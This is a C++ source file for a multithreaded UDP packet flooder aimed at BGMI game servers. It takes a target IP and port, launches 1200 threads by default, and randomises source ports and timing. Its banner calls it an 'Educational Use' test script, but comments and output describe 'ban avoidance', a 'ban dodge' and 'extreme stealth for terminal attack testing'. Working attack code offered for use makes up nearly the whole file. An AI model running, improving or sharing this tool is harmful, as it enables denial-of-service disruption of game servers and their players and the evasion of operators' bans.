#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string>
#include <cstring>
#include <fcntl.h>
#include <random>

#define MAX_PACKET_SIZE 65507
#define MIN_PACKET_SIZE 1
#define DEFAULT_NUM_THREADS 1200  // Your ideal thread count
#define DEFAULT_DELAY_MS 10000    // 10-second base delay (0-20s jitter)
#define DEFAULT_PACKET_SIZE 64    // BGMI-like packet size
#define MAX_PACKETS_PER_THREAD 10 // Cap packets to avoid ban

long long totalPacketsSent = 0;
long long totalPacketsReceived = 0;
double totalDataMB = 0.0;
std::mutex statsMutex;
bool keepSending = true;
bool keepReceiving = true;

std::random_device rd;
std::mt19937 gen(rd());

// Simple BGMI-like packet header simulation (guesswork)
struct BgmiPacket {
    uint16_t header = 0xABCD; // Fake header
    uint32_t sequence = 0;    // Packet sequence
    char data[56];            // 64 - 8 bytes header = 56 bytes payload
};

void packetSender(int threadId, const std::string& targetIp, int targetPort, int durationSeconds, int packetSize, int numThreads, int delayMs) {
    int udpSocket;
    struct sockaddr_in serverAddr;
    BgmiPacket packet;

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) return;

    // Random source port
    struct sockaddr_in localAddr;
    localAddr.sin_family = AF_INET;
    localAddr.sin_addr.s_addr = INADDR_ANY;
    std::uniform_int_distribution<> portDis(1024, 65535);
    localAddr.sin_port = htons(portDis(gen));
    bind(udpSocket, (struct sockaddr*)&localAddr, sizeof(localAddr));

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());
    serverAddr.sin_port = htons(targetPort);

    long long threadPackets = 0;
    double threadDataMB = 0.0;
    auto startTime = std::chrono::steady_clock::now();
    std::uniform_int_distribution<> dis(0, delayMs * 2);
    std::uniform_int_distribution<> charDis(33, 126);

    while (keepSending && threadPackets < MAX_PACKETS_PER_THREAD) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();
        if (elapsed >= durationSeconds) break;

        // Fill packet with random data
        packet.sequence = threadPackets;
        for (int i = 0; i < sizeof(packet.data) - 1; ++i) {
            packet.data[i] = static_cast<char>(charDis(gen));
        }
        packet.data[sizeof(packet.data) - 1] = '\0';

        ssize_t bytesSent = sendto(udpSocket, &packet, sizeof(packet), 0,
                                 (struct sockaddr*)&serverAddr, sizeof(serverAddr));
        if (bytesSent > 0) {
            threadPackets++;
            threadDataMB += static_cast<double>(bytesSent) / (1024.0 * 1024.0);
        }

        // Extreme jitter to avoid ban
        int randomDelay = dis(gen);
        std::this_thread::sleep_for(std::chrono::milliseconds(randomDelay));
    }

    std::cout << "Thread " << threadId << ": Sent " << threadPackets
              << " packets (" << std::fixed << std::setprecision(2) << threadDataMB << " MB)\n";

    {
        std::lock_guard<std::mutex> lock(statsMutex);
        totalPacketsSent += threadPackets;
        totalDataMB += threadDataMB;
    }

    close(udpSocket);
}

void packetReceiver(int listenPort, int packetSize) {
    int udpSocket;
    struct sockaddr_in serverAddr, clientAddr;
    char* buffer = new char[packetSize];
    socklen_t clientLen = sizeof(clientAddr);

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        delete[] buffer;
        return;
    }

    int flags = fcntl(udpSocket, F_GETFL, 0);
    fcntl(udpSocket, F_SETFL, flags | O_NONBLOCK);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(listenPort);

    if (bind(udpSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        close(udpSocket);
        delete[] buffer;
        return;
    }

    while (keepReceiving) {
        ssize_t bytes = recvfrom(udpSocket, buffer, packetSize, 0,
                               (struct sockaddr*)&clientAddr, &clientLen);
        if (bytes > 0) {
            std::lock_guard<std::mutex> lock(statsMutex);
            totalPacketsReceived++;
        }
        else if (bytes < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    close(udpSocket);
    delete[] buffer;
}

int main(int argc, char* argv[]) {
    std::cout << "\n";
    std::cout << "=======================================\n";
    std::cout << "  BGMI VPS Test Script (Educational Use)\n";
    std::cout << "  1200 threads, ban avoidance (1-day ban dodge)\n";
    std::cout << "  Extreme stealth for terminal attack testing\n";
    std::cout << "=======================================\n";
    std::cout << "\n";

    if (argc < 5 || argc > 7) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <time> <packet_size> [threads] [delay_ms]\n";
        std::cerr << "Example: " << argv[0] << " <bgmi_ip> <bgmi_port> 60 64 1200 10000\n";
        return 1;
    }

    std::string targetIp = argv[1];
    int targetPort = std::stoi(argv[2]);
    int durationSeconds = std::stoi(argv[3]);
    int packetSize = std::stoi(argv[4]);
    int numThreads = (argc >= 6) ? std::stoi(argv[5]) : DEFAULT_NUM_THREADS;
    int delayMs = (argc == 7) ? std::stoi(argv[6]) : DEFAULT_DELAY_MS;

    if (targetIp.empty()) targetIp = "127.0.0.1";
    if (durationSeconds <= 0) durationSeconds = 60;
    if (packetSize < MIN_PACKET_SIZE || packetSize > MAX_PACKET_SIZE) packetSize = DEFAULT_PACKET_SIZE;
    if (numThreads <= 0) numThreads = DEFAULT_NUM_THREADS;
    if (delayMs < 0) delayMs = DEFAULT_DELAY_MS;

    std::cout << "Starting receiver thread...\n";
    std::thread receiverThread(packetReceiver, targetPort, packetSize);

    std::vector<std::thread> senderThreads;
    for (int i = 0; i < numThreads; ++i) {
        senderThreads.emplace_back(packetSender, i, targetIp, targetPort, durationSeconds, packetSize, numThreads, delayMs);
    }

    std::cout << "Sending packets to " << targetIp << ":" << targetPort
              << " from VPS with " << numThreads << " threads, packet size "
              << packetSize << " bytes, delay " << delayMs << " ms...\n";

    for (auto& t : senderThreads) {
        t.join();
    }

    std::cout << "All sender threads completed...\n";
    keepSending = false;
    
    std::this_thread::sleep_for(std::chrono::seconds(1));
    keepReceiving = false;
    
    std::cout << "Waiting for receiver thread to join...\n";
    receiverThread.join();
    std::cout << "Receiver thread joined...\n";

    std::cout << "\nTEST COMPLETE\n";
    std::cout << "Total Packets Sent: " << totalPacketsSent << " packets\n";
    std::cout << "Total Data: " << std::fixed << std::setprecision(2) << totalDataMB << " MB\n";

    return 0;
}